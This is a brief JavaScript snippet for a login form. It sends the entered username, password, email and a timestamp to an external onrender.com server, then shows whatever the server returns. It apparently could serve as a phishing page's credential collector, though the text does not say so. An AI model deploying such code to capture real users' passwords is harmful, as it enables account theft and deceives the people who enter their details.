        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const data = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                email: document.getElementById('email').value,
                date: new Date().toLocaleString()
            };

            // Отправляем данные на сервер
            const response = await fetch('https://summerserver.onrender.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            const result = await response.text();
            document.body.innerHTML = result;
        });